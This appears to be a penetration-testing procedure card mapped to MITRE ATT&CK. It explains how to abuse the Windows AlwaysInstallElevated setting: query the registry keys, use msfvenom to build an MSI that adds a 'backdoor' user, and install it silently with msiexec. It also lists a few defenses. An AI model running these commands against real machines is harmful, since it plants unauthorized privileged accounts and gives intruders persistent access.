---
id: e7ab4931-d61e-4807-b460-df373f67d131
name: Windows - AlwaysInstallElevated Privilege Escalation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.773506+00:00'
updated_at: '2023-04-10T20:37:33.329582+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
tags:
- '[[EoP - AlwaysInstallElevated]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Create MSI payload with backdoor user credentials]]'
- '[[Create MSI payload with backdoor user credentials (without UAC prompt)]]'
- '[[Install the malicious MSI package silently]]'
---

# Windows - AlwaysInstallElevated Privilege Escalation

## Summary

The AlwaysInstallElevated registry key is a Windows Installer setting that allows non-administrative users to install software with elevated privileges. This can be abused by attackers to escalate their privileges on a compromised system. An attacker can modify the registry key to enable the settin

## Description

# Description

The AlwaysInstallElevated registry key is a Windows Installer setting that allows non-administrative users to install software with elevated privileges. This can be abused by attackers to escalate their privileges on a compromised system. An attacker can modify the registry key to enable the setting and then install a backdoor MSI package that grants them persistent access to the system. From there, the attacker can move laterally and perform other malicious activities.

## Requirements

1. Access to the target system

1. Ability to modify the AlwaysInstallElevated registry key

1. Ability to create and install a backdoor MSI package

## Defense

1. Regularly monitor and audit registry key changes

1. Restrict access to the AlwaysInstallElevated registry key

1. Use application whitelisting to prevent unauthorized software installation

## Objectives

1. Escalate privileges on a compromised system

1. Install a backdoor MSI package for persistent access

1. Move laterally and perform other malicious activities

# Instructions

1. Run the commands in the PowerShell terminal and check the output for the values of AlwaysInstallElevated registry key for both HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer and HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer.

**Code**: [[$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windo]]

> This command checks if the registry values for AlwaysInstallElevated are set to "1". The registry values are checked for both HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer and HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer. The command can be run in a PowerShell terminal and the output can be checked to ensure that the values are set to "1". The Get-ItemProperty command is used to retrieve the values of the registry keys.

2. To create an MSI package, use the msfvenom tool with the specified options to create a backdoor user with the given credentials. The '-f msi' option specifies the output format as MSI. The '-o' option specifies the output file name. To install the MSI package, use the msiexec tool with the specified options. The '/quiet' and '/qn' options suppress any user interface during installation.

**Code**: [[$ msfvenom -p windows/adduser USER=backdoor PASS=b]]

> The msfvenom tool is used to generate payloads for exploitation. In this case, we are creating an MSI package that will install a backdoor user with the specified credentials. The '-f msi' option specifies the output format as MSI. The '-o' option specifies the output file name. The 'USER' and 'PASS' arguments specify the username and password for the backdoor user. The '-nouac' option disables the User Account Control (UAC) prompt during installation. The msiexec tool is used to install MSI packages. The '/quiet' and '/qn' options suppress any user interface during installation. The '/i' option specifies the path to the MSI package.

**Command** ([[Create MSI payload with backdoor user credentials]]):

```bash
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```

**Command** ([[Create MSI payload with backdoor user credentials (without UAC prompt)]]):

```bash
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
```

**Command** ([[Install the malicious MSI package silently]]):

```bash
$ msiexec /quiet /qn /i C:\evil.msi
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]

## Commands Used

- [[Create MSI payload with backdoor user credentials]]
- [[Create MSI payload with backdoor user credentials (without UAC prompt)]]
- [[Install the malicious MSI package silently]]

## Tags

- [[EoP - AlwaysInstallElevated]]
- [[Windows - Privilege Escalation]]
